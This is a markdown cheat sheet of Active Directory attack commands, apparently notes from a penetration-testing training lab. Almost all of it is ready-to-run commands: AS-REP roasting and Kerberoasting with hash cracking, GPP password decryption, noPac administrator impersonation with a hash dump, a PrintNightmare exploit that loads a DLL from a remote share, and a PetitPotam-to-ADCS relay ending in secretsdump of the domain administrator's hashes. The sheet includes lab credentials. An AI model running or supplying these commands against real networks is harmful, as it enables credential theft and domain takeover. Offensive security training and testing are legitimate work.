## AD Exploitation

### ASREP_roasting
```bash
GetNPUsers.py -request -format hashcat -outputfile ASREProastables.txt -usersfile users.txt -dc-ip "$DC_IP" "$DOMAIN"/
Get-DomainUser -PreauthNotRequired -verbose
nxc ldap 192.168.0.104 -u `fzf-wordlist` -p '' --asreproast asreproastables.txt
Rubeus.exe asreproast /format:hashcat /outfile:hashes.asreproast [/user:username]
hashcat -m 18200 hashes.asreproast `fzf-wordlist`
```

### Kerberoasting
```bash
GetUserSPNs.py -outputfile Kerberoastables.txt -dc-ip "DC_IP" "DOMAIN.EX"/"USER":"PASSWORD"
Rubeus.exe kerberoast /outfile:C:\Windows\Tasks\hashes.txt
hashcat -m 13100 file_h `fzf-wordlist`
```

### GPP Password
```bash
nxc smb ip -u '' -p '' -M gpp_password
# With metasploit
use auxiliary/smb_enum_gpp
# crack the result with 
gpp-decrypt <password>
```

### Users 
```powershell
runas /netonly /user:INLANEFREIGHT\adunn powershell
```

### NoPac
```bash
python3 scanner.py inlanefreight.local/forend:Klmcargo2 -dc-ip 172.16.5.5 -use-ldap
python3 noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 -dc-ip 172.16.5.5  -dc-host ACADEMY-EA-DC01 -shell --impersonate administrator -use-ldap
python3 noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 -dc-ip 172.16.5.5  -dc-host ACADEMY-EA-DC01 --impersonate administrator -use-ldap -dump -just-dc-user INLANEFREIGHT/administrator
```

### Bleeding vuln
```bash
python3 CVE-2021-1675.py inlanefreight.local/forend:Klmcargo2@172.16.5.5 '\\172.16.5.225\CompData\backupscript.dll'
```

### PetitPotam
```bash
ntlmrelayx.py -debug -smb2support --target http://ACADEMY-EA-CA01.INLANEFREIGHT.LOCAL/certsrv/certfnsh.asp --adcs --template DomainController
python3 PetitPotam.py 172.16.5.225 172.16.5.5
# Output example : 
#[*] Authenticating against http://ACADEMY-EA-CA01.INLANEFREIGHT.LOCAL as INLANEFREIGHT/ACADEMY-EA-DC01$ SUCCEED
#[*] Generating CSR...
#[*] CSR generated!
#[*] Getting certificate...
#[*] GOT CERTIFICATE!
python3 gettgtpkinit.py INLANEFREIGHT.LOCAL/ACADEMY-EA-DC01\$ -pfx-base64 MIIStQIBAzCCEn8GCSqGSI...SNIP...CKBdGmY= dc01.ccache
export KRB5CCNAME=dc01.ccache
secretsdump.py -just-dc-user INLANEFREIGHT/administrator -k -no-pass "ACADEMY-EA-DC01$"@ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
klist
```